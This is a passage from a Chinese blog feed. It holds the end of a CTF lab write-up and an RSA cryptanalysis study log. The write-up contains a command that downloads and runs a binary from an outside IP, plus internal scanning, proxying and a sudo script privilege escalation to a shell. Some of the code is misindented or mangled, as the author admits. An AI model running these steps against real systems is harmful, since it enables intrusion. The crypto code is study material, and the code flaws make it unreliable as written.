class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/8cca3c21e8b193b78173f0baaf3c0a0e.png" alt="img"></p><h3 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h3><p>查看ip信息，发现新的网段172.38.10.0/24</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/3e191208df8afa3c49845ca048e37537.png" alt="img"></p><p>上传TailorScan进行内网扫描 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br></pre></td></tr></table></figure><p>对其进行全端口扫描或者top100</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/43e96e9d1a05677f2d106b7ecd62fcd8.png" alt="img"></p><p>发现内网设备 <code>172.38.10.3</code>，并仅开放22端口。前面在数据库中看到的用户名密码还没有使用，在这里进行尝试登录：</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/2c0438d8515d1a43b73409c9facbcdbf.png" alt="img"></p><p>发现无法登录。将网络代理出来。在本地进行登录：</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4d8a095b90fcb4fb23e986c391adf0af.png" alt="img"></p><p>首先查看当前用户信息，是BMZCTFer</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/2e7a9370749e97e902a3ac81ea391d7b.png" alt="img"></p><p>再查看靶机的用户，有BMZCTFer和BMZCTFFLAGer。</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/17f5aa862f5a547280bca924f2c3446d.png" alt="img"></p><p>再查看/flag文件信息。发现/flag6。只有root可以读取。</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/8ede99c8cb380eeb449380794b2a7dd4.png" alt="img"></p><p>我们再查看flag6的ACL权限。</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/a3d56755ec9e1435510fc2c87ec4f0d8.png" alt="img"></p><p>发现BMZCTFFLAGer就可以读取。所以我们要提权到BMZCTFFLAGer。</p><p>查看BMZCTFFLAGer家目录。发现 <code>talk.sh</code>文件。并有可执行权限。</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/cd409821813dff30bd7d5a8f1ac954e1.png" alt="img"></p><p>查看文件</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/c0c580cfb1f23829ff50f2e86e347bcd.jpeg" alt="img"></p><p>看到</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$msg</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p>这个是个漏洞。可以利用。 </p><p>先执行一次。发现没有什么效果。</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/51856447b74761e1c26e996ddb1f6a61.png" alt="img"></p><p>再查看sudo权限</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/5b29f4a63247453678dbc986b4558153.png" alt="img"></p><p>看到可以不使用密码，就能以BMZCTFFLAGer用户执行talk.sh文件。我们以BMZCTFFLAGer用户执行talk.sh，并在 <code>$msg</code>处输入 <code>/bin/sh</code>。</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/def9ea3247b1514c2cba053e5cbf8da4.jpeg" alt="img"></p><p>这样我们就得到了BMZCTFFLAGer用户的shell。</p><p>最后查看/flag6。我们就得到了flag</p><hr><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><blockquote><p>因为开头交代的原因，代码的缩紧逻辑有误。</p><p>若找到错误，麻烦各方向师傅直接发出更正后的代码（附上题目名称、前后的步骤）</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假修炼记（一）</title>
      <link href="/2021/12/30/%E5%AF%92%E5%81%87%E4%BF%AE%E7%82%BC%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/12/30/%E5%AF%92%E5%81%87%E4%BF%AE%E7%82%BC%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>哈尔滨地区的大学，寒假早而久。<br>于12.27日十点便已解放，28日下午七时方才到家。</p></blockquote><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcXXSLDaY1wnpBkiYD5tSLkGa9flc7EaIddubI1Hz635Dxzz*suKMNSl0s4on1UnK8JxCw14Fw6G4tgIKxL6K*Oo!/b&bo=oAU4BAAAAAABF6k!&rf=viewer_4" alt="u know what i mean"></p><p>🤔大有效仿凡人修仙转之意，本着记录每日以“<strong>匕首反握，杀死懒惰</strong>”原则，开下此篇。</p><p>大体上，密码手的安排，自然是得先把<strong>密码</strong>搞清楚有多难。</p><p>又因为谋划着转到计科，还得学些<strong>C</strong>、<strong>离散数学</strong>与做些玩具般的<strong>项目</strong>为好。</p><h1 id="12-28-29"><a href="#12-28-29" class="headerlink" title="12.28/29"></a>12.28/29</h1><h2 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h2><h2 id="王小波"><a href="#王小波" class="headerlink" title="王小波"></a>王小波</h2><p><img src="https://s2.loli.net/2022/01/04/aCBcoHmPRluq751.png" alt="截屏2021-12-29 下午4.54.21"></p><h3 id="愁容骑士"><a href="#愁容骑士" class="headerlink" title="愁容骑士"></a>愁容骑士</h3><h3 id="乌云典当铺"><a href="#乌云典当铺" class="headerlink" title="乌云典当铺"></a>乌云典当铺</h3><h2 id="酒精"><a href="#酒精" class="headerlink" title="酒精"></a>酒精</h2><h2 id="计算器乐"><a href="#计算器乐" class="headerlink" title="计算器乐"></a>计算器乐</h2><h2 id="炉石传说"><a href="#炉石传说" class="headerlink" title="炉石传说"></a>炉石传说</h2><hr><h1 id="12-30"><a href="#12-30" class="headerlink" title="12.30"></a>12.30</h1><h2 id="Crypto·RSA"><a href="#Crypto·RSA" class="headerlink" title="Crypto·RSA"></a>Crypto·RSA</h2><p><strong>RSA系列视频</strong>：<a href="https://www.bilibili.com/video/BV1Dw411f7Ht?p=2">风二西RSA教学</a></p><h3 id="数学知识–模运算"><a href="#数学知识–模运算" class="headerlink" title="数学知识–模运算"></a>数学知识–模运算</h3><h4 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h4><blockquote><p>(a + b) % p = (a % p + b % p) % p<br>(a - b) % p = (a % p - b % p) % p<br>(a * b) % p = (a % p * b % p) % p<br>a ^ b % p = ((a % p) ^ b) % p </p></blockquote><p><strong>注</strong>：% 为取余， ^为幂.</p><h4 id="结合律"><a href="#结合律" class="headerlink" title="结合律"></a>结合律</h4><blockquote><p>((a + b) % p + c) = (a + (b + c) % p) % p<br>((a * b) % p * c) = (a * (b * c) % p) % p </p></blockquote><h4 id="交换律"><a href="#交换律" class="headerlink" title="交换律"></a>交换律</h4><blockquote><p>(a + b) % p = (b + a) % p<br>(a * b) % p = (b * a) % p</p></blockquote><h4 id="分配律"><a href="#分配律" class="headerlink" title="分配律"></a>分配律</h4><blockquote><p>(a + b) % p = (a % p + b % p) % p<br>((a + b) % p * c) % p = ((a * c) % p + (b * c) % p )%p</p></blockquote><h4 id="重要定理"><a href="#重要定理" class="headerlink" title="重要定理"></a>重要定理</h4><blockquote><p>若 a ≡ b (mod p)，则对于任意的 c，都有(a + c) ≡ (b + c) (mod p)<br>若 a ≡ b (mod p)，则对于任意的 c，都有(a * c) ≡ (b * c) (mod p)<br>若 a ≡ b (mod p)，c ≡ d (mod p)，则<br>(a + c) ≡ (b + d) (mod p)<br>(a - c) ≡ (b - d) (mod p)<br>(a * c) ≡ (b * d) (mod p)<br>(a / c) ≡ (b / d) (mod p) </p></blockquote><h3 id="原理证明"><a href="#原理证明" class="headerlink" title="原理证明"></a>原理证明</h3><p>证明RSA加/解密的正确性</p><img src="https://s2.loli.net/2021/12/30/qIjesrkzAchTB5U.png" alt="image-20211230194843182" style="zoom:200%;" /><h3 id="py库libnum"><a href="#py库libnum" class="headerlink" title="py库libnum"></a>py库libnum</h3><h4 id="获得指定比特位素数"><a href="#获得指定比特位素数" class="headerlink" title="获得指定比特位素数"></a>获得指定比特位素数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.generate_prime(bits) </span><br></pre></td></tr></table></figure><h4 id="字符串与数字之间的转换（string-to-num"><a href="#字符串与数字之间的转换（string-to-num" class="headerlink" title="字符串与数字之间的转换（string to num"></a>字符串与数字之间的转换（string to num</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.s2n(m)</span><br></pre></td></tr></table></figure><h4 id="求解逆元"><a href="#求解逆元" class="headerlink" title="求解逆元"></a>求解逆元</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.invmod(e, phi) </span><br></pre></td></tr></table></figure><h3 id="费马分解"><a href="#费马分解" class="headerlink" title="费马分解"></a>费马分解</h3><blockquote><p>当直接分解n不出且知道p、q两素数大小接近时，可以用费马分解写脚本来得到p、q</p></blockquote><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isqrt</span>(<span class="params">n</span>):</span></span><br><span class="line">  x = n</span><br><span class="line">  y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> y &lt; x:</span><br><span class="line">    x = y</span><br><span class="line">    y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat</span>(<span class="params">n, verbose=<span class="literal">True</span></span>):</span></span><br><span class="line">    a = isqrt(n) <span class="comment"># int(ceil(n**0.5))</span></span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b*b != b2:</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p=a+b</span><br><span class="line">    q=a-b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line">fermat(n) </span><br></pre></td></tr></table></figure><h3 id="公-私钥"><a href="#公-私钥" class="headerlink" title="公/私钥"></a>公/私钥</h3><h4 id="公钥生成"><a href="#公钥生成" class="headerlink" title="公钥生成"></a>公钥生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">rsa_components = (<span class="built_in">int</span>(n), <span class="built_in">int</span>(e))  <span class="comment"># 只需要n，e</span></span><br><span class="line">keypair = RSA.construct(rsa_components)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pubckey.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    f.write(keypair.exportKey()) </span><br></pre></td></tr></table></figure><h4 id="私钥生成"><a href="#私钥生成" class="headerlink" title="私钥生成"></a>私钥生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">rsa_components = (<span class="built_in">int</span>(n),<span class="built_in">int</span>(e),<span class="built_in">int</span>(d),<span class="built_in">int</span>(p),<span class="built_in">int</span>(q))  <span class="comment"># 至少需要n、e、d</span></span><br><span class="line">keypair = RSA.construct(rsa_components)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private1.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    f.write(keypair.exportKey()) </span><br></pre></td></tr></table></figure><h4 id="公钥读取"><a href="#公钥读取" class="headerlink" title="公钥读取"></a>公钥读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pubckey.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e = %d&#x27;</span> % key.e) </span><br></pre></td></tr></table></figure><h4 id="私钥读取"><a href="#私钥读取" class="headerlink" title="私钥读取"></a>私钥读取</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">from</span> Crypto.PublicKey import RSA</span><br><span class="line">with<span class="meta"> open(</span><span class="string">&quot;private1.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="meta">as</span> f:</span><br><span class="line"><span class="meta">key</span> = RSA.import_key(f.read())</span><br><span class="line">p<span class="meta">rint(</span><span class="string">&#x27;n = %d&#x27;</span> % <span class="meta">key</span>.n)</span><br><span class="line">    p<span class="meta">rint(</span><span class="string">&#x27;e = %d&#x27;</span> % <span class="meta">key</span>.e) </span><br><span class="line">    p<span class="meta">rint(</span><span class="string">&#x27;d = %d&#x27;</span> % <span class="meta">key</span>.d)</span><br><span class="line">    p<span class="meta">rint(</span><span class="string">&#x27;p = %d&#x27;</span> % <span class="meta">key</span>.p) </span><br><span class="line">    p<span class="meta">rint(</span><span class="string">&#x27;q = %d&#x27;</span> % <span class="meta">key</span>.q)</span><br></pre></td></tr></table></figure><h4 id="OAEP"><a href="#OAEP" class="headerlink" title="OAEP"></a>OAEP</h4><blockquote><p><strong>最优非对称加密填充</strong>（英语：<strong>Optimal Asymmetric Encryption Padding</strong>，缩写：<strong>OAEP</strong></p></blockquote><p><img src="https://s2.loli.net/2021/12/30/5TBeAoCOcGtPZmM.png" alt="image-20211230214358786"></p><p>OAEP结构，正常读取求解会导致结果乱码。<br>需要针对性的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_generator = Random.new().read</span><br><span class="line">rsa = RSA.generate(<span class="number">2048</span>, random_generator)</span><br><span class="line"><span class="comment"># 生成私钥</span></span><br><span class="line">private_key = rsa.exportKey()</span><br><span class="line"><span class="comment"># print(private_key.decode(&#x27;utf-8&#x27;))</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rsa_private_key.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(private_key)</span><br><span class="line"><span class="comment"># 生成公钥</span></span><br><span class="line">public_key = rsa.publickey().exportKey()</span><br><span class="line"><span class="comment"># print(public_key.decode(&#x27;utf-8&#x27;))</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rsa_public_key.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(public_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#测试用密钥加密</span></span><br><span class="line">public_key = RSA.importKey(public_key)</span><br><span class="line">msg=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">pk = PKCS1_v1_5.new(public_key)</span><br><span class="line">encrypt_text = pk.encrypt(msg.encode())</span><br><span class="line"><span class="built_in">print</span>(encrypt_text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试密钥解密</span></span><br><span class="line">private_key = RSA.importKey(private_key)</span><br><span class="line">pk = PKCS1_v1_5.new(private_key)</span><br><span class="line">msg = pk.decrypt(encrypt_text,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#两种标准</span></span><br><span class="line">rsa_components = (n, e, <span class="built_in">int</span>(d), p, q)</span><br><span class="line">arsa = RSA.construct(rsa_components)</span><br><span class="line">rsakey = RSA.importKey(arsa.exportKey())</span><br><span class="line">rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">decrypted = rsakey.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><hr><h1 id="12-31"><a href="#12-31" class="headerlink" title="12.31"></a>12.31</h1><h2 id="Crypto·RSA-1"><a href="#Crypto·RSA-1" class="headerlink" title="Crypto·RSA"></a>Crypto·RSA</h2><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><blockquote><p>针对同明文m、同n，且$e_1$与$e_2$<strong>互质</strong></p></blockquote><h4 id="出题角度"><a href="#出题角度" class="headerlink" title="出题角度"></a>出题角度</h4><p>对明文m用两个e，同一n加密。</p><p>格式：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">m</span> = ....</span><br><span class="line"><span class="attr">n1</span> = n2 = n = ...</span><br><span class="line"><span class="attr">e1</span> = ...</span><br><span class="line"><span class="attr">e2</span> = ...</span><br><span class="line"><span class="attr">c1</span> = ...</span><br><span class="line"><span class="attr">c2</span> = ...</span><br></pre></td></tr></table></figure><h4 id="解题角度"><a href="#解题角度" class="headerlink" title="解题角度"></a>解题角度</h4><h5 id="数学角度"><a href="#数学角度" class="headerlink" title="数学角度"></a>数学角度</h5><p>学习了<strong>扩展欧几里得算法</strong>（先前用来算e对phi的逆元d）,</p><p>共模攻击也用上了</p><blockquote><p><strong>扩展欧几里得算法</strong>：对于不全为0的a、b,有：ax + by = gcd(a, b)<br>其中gcd(a, b) 表示 a，b的最大公约数</p></blockquote><p>用其得到 满足 $s_1·e_1 + s_2·e_2 = gcd(e_1, e_2) = 1$的 $s_1、s_2$</p><p>最终，明文m可用如下公式得到：</p><p>$$m = (C_1^{s_1}modn\cdot C_2^{s_2}modn)modn$$</p><h4 id="计算机角度"><a href="#计算机角度" class="headerlink" title="计算机角度"></a>计算机角度</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n= <span class="number">25333966058003377512707481338795714713737652659944601834182685873529702913988641983855700459996104700470621411559153944988952210084014634675583566338568882440708528997808798650962116756969822211586531522430245040013570571043385238601846104615050089457836721437790715225367971106085839523500735480715155424498941150468093083816830215632716244390679417218873179734276657411907216486790815037105108306055794473002315541787461904728375164737225486501009857299717749346279371251245318729951905832578739696926931502225899707226264570557623527701806829827566904224572897378639191756878049342203546309520458672464170859577433</span></span><br><span class="line">e1= <span class="number">2333</span></span><br><span class="line">c1= <span class="number">11355981897781478907853356911752561659125575027336719997290835661089901154031171698660586203170528368228850895159361637188990782030255983633790580700032092629587631108597144196551438410868034739981960656110887650747325311613900008001234835897835613759692146419080113176963747835592656185435741504176116672174539018089139547795447109458469225330809064539216773123671814859510069089532677704482026169178543062578686794346026774853085101278125763460212801929360456888869350105294595904940799522522144740464043605342348269086324747729288399275079874271519208155039364092577755518532799345651172433227745483422620900776136</span></span><br><span class="line">e2= <span class="number">23333</span></span><br><span class="line">c2= <span class="number">1326499538902841116411674554069945581390130048432351353260154261863309471312810811160302458644816390944833633923435634961251092531893503039914793217247984595331920909367627316087404934402312358642315675486438968585084964845763881078835787872160374025547400141298650794551970291119975344578667689961134814676553190178139842507675899262024572370313939107080072875068218336255452161407859907308656094331557912187788276334833723893856310434523337557011032081467262457427167978528280339494077785813461280853735266463152709443731638714219391773144349752633555310299318290576258086971373777118482642702020599928071855133041</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 没忍住，验证了下求逆元的函数用来解好不好使</span></span><br><span class="line"><span class="string"># 因为都是用到扩展欧几里得原理，当然可解</span></span><br><span class="line"><span class="string">s1 = int(gmpy2.invert(e1, e2))</span></span><br><span class="line"><span class="string">s2 = int((1-e1*s1)/e2)</span></span><br><span class="line"><span class="string">m = pow(c1, s1, n) * pow(c2, s2, n)% n</span></span><br><span class="line"><span class="string">print(libnum.n2s(m))</span></span><br><span class="line"><span class="string"># b&#x27;flag&#123;6ed4c74e022cb18c8039e96de93aa9ce&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s, s1, s2 = gmpy2.gcdext(e1, e2)  <span class="comment"># s为gcd(e1, e2)</span></span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c1, s1, n)*<span class="built_in">pow</span>(c2, s2, n)%n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h4 id="原理证明-1"><a href="#原理证明-1" class="headerlink" title="原理证明"></a>原理证明</h4><blockquote><p>证明共模攻击的可行性</p></blockquote><p><img src="https://s2.loli.net/2021/12/31/3ISNz5Lkmr2jAfi.png" alt="image-20211231161616389"></p><h3 id="维纳攻击"><a href="#维纳攻击" class="headerlink" title="维纳攻击"></a>维纳攻击</h3><blockquote><p>针对e过大</p></blockquote><h4 id="原理🤔"><a href="#原理🤔" class="headerlink" title="原理🤔"></a>原理🤔</h4><blockquote><p><a href="https://blog.csdn.net/weixin_46395886/article/details/114757828?spm=1001.2101.3001.6650.8&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-8.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-8.no_search_link&utm_relevant_index=10">道阻且长</a></p></blockquote><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continuedFra</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算连分数</span></span><br><span class="line"><span class="string">    :param x: 分子</span></span><br><span class="line"><span class="string">    :param y: 分母</span></span><br><span class="line"><span class="string">    :return: 连分数列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradualFra</span>(<span class="params">cf</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算传入列表最后的渐进分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表最后的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="comment"># 这里的渐进分数分子分母要分开</span></span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pq</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span></span><br><span class="line"><span class="string">    :param a:x^2的系数</span></span><br><span class="line"><span class="string">    :param b:x的系数</span></span><br><span class="line"><span class="string">    :param c:pq</span></span><br><span class="line"><span class="string">    :return:p，q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getGradualFra</span>(<span class="params">cf</span>):</span></span><br><span class="line">    <span 